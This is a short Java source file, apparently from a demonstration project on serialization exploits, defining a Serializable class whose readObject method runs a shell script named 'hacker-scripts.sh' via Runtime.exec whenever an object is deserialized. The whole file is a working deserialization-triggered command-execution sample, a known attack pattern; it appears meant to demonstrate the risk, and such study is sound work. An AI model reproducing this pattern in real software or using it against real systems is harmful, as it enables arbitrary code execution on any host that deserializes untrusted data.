package com.example;


import java.io.File;
import java.io.IOException;

public class MySystem implements java.io.Serializable
{
    public String name;
    public String address;

    private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{
        in.defaultReadObject();
        this.name = this.name+"!";
        System.out.println("-  bwaaaa now run system command.... ");
        Runtime.getRuntime().exec("/home/smckinn/Development/serial-exploit-sample/src/main/resources/hacker-scripts.sh");
        System.out.println("system command has been run.... ");
    }
}